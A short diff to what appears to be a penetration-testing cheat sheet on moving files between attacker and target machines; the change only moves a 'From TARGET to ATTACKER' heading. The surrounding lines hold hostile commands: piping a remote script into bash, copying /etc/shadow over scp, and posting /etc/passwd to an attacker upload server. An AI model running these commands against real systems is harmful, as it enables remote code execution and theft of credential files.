@@ -49,6 +49,8 @@ curl http://$IP/test.sh | bash
 scp root@$IP:/etc/shadow .
 ```
 
+## From TARGET to ATTACKER
+
 ### Linux web upload
 
 ```bash
@@ -64,8 +66,6 @@ python3 -m uploadserver 443 --server-certificate ../server.pem
 # Upload the file
 curl -X POST https://$IP/upload -F 'files=@/etc/passwd' --insecure
 ```
-
-## From TARGET to ATTACKER
 
 ### SSH upload
 
